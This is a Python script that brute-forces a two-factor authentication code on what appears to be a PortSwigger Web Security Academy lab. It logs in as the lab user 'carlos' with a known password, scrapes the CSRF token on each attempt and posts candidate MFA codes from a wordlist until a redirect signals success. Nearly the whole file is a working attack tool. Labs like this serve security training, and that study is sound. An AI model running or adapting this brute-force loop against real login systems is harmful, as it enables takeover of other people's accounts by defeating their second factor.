from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import Progress
from rich.progress import track
from rich.theme import Theme
custom_theme = Theme({
    "info": "green",
    "warning": "yellow",
    "danger": "bold red"
})
console = Console(theme=custom_theme)


app = typer.Typer()



@app.command()
def run():
    lab_id= '0a7900dc0371f630818fb695006d0067'
    
    victim_username = 'carlos'
    victim_password = 'montoya'

    attempt_limit = 2

    status_code = 302
    session = requests.session()



    logged_in_string = "Your username is:"
    count = 0 
   
    with open("codes.txt", "r") as file:
        file_lines = file.readlines()
        file_length = len(file_lines)
        with Progress() as progress:
            task = progress.add_task(f"Code fuzzing for {victim_username} ...", total=file_length) 
            for code in file_lines:
                #print(username)
                code=code.strip()
        
                
                if not code:
                    break
                code=code.strip()
                response = session.get(
                                        f"https://{lab_id}.web-security-academy.net/login", headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
                csrf=extract_csrf_from_response(response)
                # The code snippet you provided is making a POST request to a login endpoint
                # (`https://{lab_id}.web-security-academy.net/login`) with the provided
                # `victim_username` and `password` as form data. It also includes headers such as
                # `host`, `User-Agent`, and `Referer`.
                response = session.post(
                                        f"https://{lab_id}.web-security-academy.net/login", data= {
                                            "username" : victim_username,
                                            "password": victim_password,
                                            "csrf":csrf
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
                
                response = session.get(
                                        f"https://{lab_id}.web-security-academy.net/login2", headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })
                #print('here')
                #print(response.text)
                csrf=extract_csrf_from_response(response)

                response = session.post(
                                        f"https://{lab_id}.web-security-academy.net/login2", data= {
                                            "mfa-code" : code,
                                            
                                            "csrf":csrf
                                        }, headers={
                                            "host": f"{lab_id}.web-security-academy.net",
                                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

                                            "Referer": f"https://{lab_id}.web-security-academy.net/login"
                                        })

            # print(response.text)
                if response.status_code == status_code:
                    console.print(f'\nLeaked credentials code: {code}', style='warning')
                    
                    progress.update(task, advance=file_length)
                    break
                

def extract_csrf_from_response(response):
    html_document = html.fromstring(response.content)
    #print(html_document.text)
    list=html_document.xpath('//input[@name="csrf"]/@value')
    csrf=list[0]
    return csrf
        
                

    
    
    



    

  

    

if __name__ == "__main__":
    app()